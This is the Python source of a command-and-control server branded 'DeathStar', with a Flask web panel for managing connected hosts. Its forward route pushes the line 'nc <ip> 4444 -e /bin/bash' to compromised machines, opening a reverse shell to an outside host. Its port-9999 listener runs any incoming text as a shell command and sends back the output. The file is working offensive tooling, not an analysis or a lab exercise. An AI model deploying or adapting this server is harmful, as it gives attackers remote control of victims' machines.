import socket
import threading
from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

# Data structures to keep track of connections
connections = {}
connection_id = 1  # Global variable to keep track of connection IDs

# HTML template for the web interface
HTML_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DeathStar C2 Server</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .title-bar {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            z-index: 1000;
        }
        .content {
            margin-top: 60px; /* To avoid overlap with the fixed title bar */
            padding: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #222;
            color: #ddd;
        }
        th, td {
            padding: 10px;
            border: 1px solid #444;
            text-align: left;
        }
        th {
            background-color: #555;
        }
        tr:nth-child(even) {
            background-color: #333;
        }
        tr:hover {
            background-color: #444;
        }
        form {
            display: inline;
        }
        .drop-button {
            background-color: #dc3545; /* Red background for the drop button */
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
        .drop-button:hover {
            background-color: #c82333;
        }
        .send-command-container {
            display: inline-flex;
            flex-direction: column;
            align-items: flex-end;
        }
        input[type="text"], input[type="submit"] {
            margin-bottom: 5px;
        }
        input[type="submit"] {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        function sendRequest(url, data, successMessage) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onload = function() {
                if (xhr.status === 200) {
                    alert(successMessage);
                    location.reload();  // Reload page to update connections
                } else {
                    alert('Error: ' + xhr.responseText);
                }
            };
            xhr.send(data);
        }

        function handleDrop(event) {
            event.preventDefault();
            var form = event.target;
            var data = new URLSearchParams(new FormData(form)).toString();
            sendRequest('/drop', data, 'Connection dropped');
        }

        function handleForward(event) {
            event.preventDefault();
            var form = event.target;
            var data = new URLSearchParams(new FormData(form)).toString();
            sendRequest('/forward', data, 'Forwarding command sent');
        }

        document.addEventListener('DOMContentLoaded', function() {
            var dropForms = document.querySelectorAll('form[action="/drop"]');
            var forwardForms = document.querySelectorAll('form[action="/forward"]');

            dropForms.forEach(function(form) {
                form.addEventListener('submit', handleDrop);
            });

            forwardForms.forEach(function(form) {
                form.addEventListener('submit', handleForward);
            });
        });
    </script>
</head>
<body>
    <div class="title-bar">
        DeathStar
    </div>
    <div class="content">
        <h1>Connections</h1>
        <table>
            <tr>
                <th>ID</th>
                <th>IP Address</th>
                <th>Actions</th>
            </tr>
            {% for id, (conn, addr) in connections.items() %}
            <tr>
                <td>{{ id }}</td>
                <td>{{ addr[0] }}</td>
                <td class="actions">
                    <div class="send-command-container">
                        <form action="/forward" method="post">
                            <input type="hidden" name="id" value="{{ id }}">
                            <input type="text" name="forward_ip" placeholder="Forward IP" required>
                            <input type="submit" value="Forward">
                        </form>
                    </div>
                    <form action="/drop" method="post">
                        <input type="hidden" name="id" value="{{ id }}">
                        <input type="submit" class="drop-button" value="Drop">
                    </form>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>
</body>
</html>
"""

# Route to display the web interface
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, connections=connections)

# Route to handle dropping connections
@app.route('/drop', methods=['POST'])
def drop():
    conn_id = request.form['id']
    conn_id = int(conn_id)  # Convert ID to integer
    if conn_id in connections:
        conn, addr = connections[conn_id]
        conn.close()
        del connections[conn_id]
        return f"Dropped connection from {addr[0]}"
    return "Connection not found"

# Route to handle forwarding commands
@app.route('/forward', methods=['POST'])
def forward():
    conn_id = request.form['id']
    forward_ip = request.form['forward_ip']
    
    conn_id = int(conn_id)  # Convert ID to integer
    if conn_id in connections:
        conn, addr = connections[conn_id]
        try:
            command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
            conn.sendall(command.encode('utf-8') + b'\n')
            return "Forwarding command sent"
        except Exception as e:
            return str(e)
    return "Connection not found"

def handle_reverse_shell(client_socket, client_address):
    global connection_id
    print(f"Connection from {client_address}")
    connections[connection_id] = (client_socket, client_address)
    current_id = connection_id
    connection_id += 1
    buffer = b""

    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break
            buffer += data
            # Process received data (assuming commands are ended with a newline)
            while b'\n' in buffer:
                command, buffer = buffer.split(b'\n', 1)
                # Execute command and send result back to the client
                try:
                    result = subprocess.run(command.decode('utf-8'), shell=True, capture_output=True)
                    client_socket.sendall(result.stdout + result.stderr)
                except Exception as e:
                    client_socket.sendall(f"Error: {e}".encode('utf-8'))
        except Exception:
            break
    
    client_socket.close()
    if current_id in connections:
        addr = connections[current_id][1]
        del connections[current_id]
        print(f"Connection closed from {addr[0]}")

def start_c2_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print("C2 server listening on port 9999")

    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_reverse_shell, args=(client_socket, client_address)).start()

if __name__ == '__main__':
    threading.Thread(target=start_c2_server, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
